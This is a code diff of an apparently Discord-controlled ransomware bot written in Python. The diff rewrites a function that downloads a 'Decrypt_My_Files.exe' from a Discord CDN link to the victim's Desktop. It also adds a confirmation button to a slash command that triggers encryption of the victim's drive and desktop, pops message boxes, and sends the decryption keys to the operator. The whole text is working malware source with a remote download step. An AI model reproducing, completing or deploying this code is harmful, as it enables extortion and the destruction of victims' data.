@@ -10,6 +10,7 @@ import re
 import base64
 import webbrowser
 import discord
+import urllib.request
 import urllib
 import tkinter as tk
 
@@ -161,14 +162,14 @@ def spam_messagebox():
     root.mainloop()
 
 def download_decrypter():
+
     NAME = os.getlogin()
-    url = 'https://cdn.discordapp.com/attachments/947224575622676520/966000491085570068/Decrypt_My_Files.exe'
-    f = urllib.urlopen(url)
-    file = f.read()
+    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
+    f = urlopen(req)
+    filecontent = f.read()
+    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
+        f.write(filecontent)
     f.close()
-    f2 = open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb')
-    f2.write(file)
-    f2.close()
 
 
 @client.event
@@ -1063,9 +1064,27 @@ async def EncryptAll_command(ctx: SlashContext):
             else:
                 shit = 420
 
-        C_drive_desktop() # Start auto encrypter
-        download_decrypter() # Download decrypter
-        spam_messagebox() # Send message box
-        await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
+        buttons = [
+                create_button(
+                    style=ButtonStyle.green,
+                    label="YES"
+                ),
+                create_button(
+                    style=ButtonStyle.red,
+                    label="NO"
+                ),
+              ]
+        action_row = create_actionrow(*buttons)
+        await ctx.send("Are you sure you want to Automatic ransom this PC?", components=[action_row])
 
+        res = await client.wait_for('button_click')
+        if res.component.label == "YES":
+            C_drive_desktop() # Start auto encrypter
+            download_decrypter() # Download decrypter
+            spam_messagebox() # Send message box
+        else:
+            await ctx.send(content="Cancelled!", hidden=True)
+
+        await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
+        
 client.run(token)
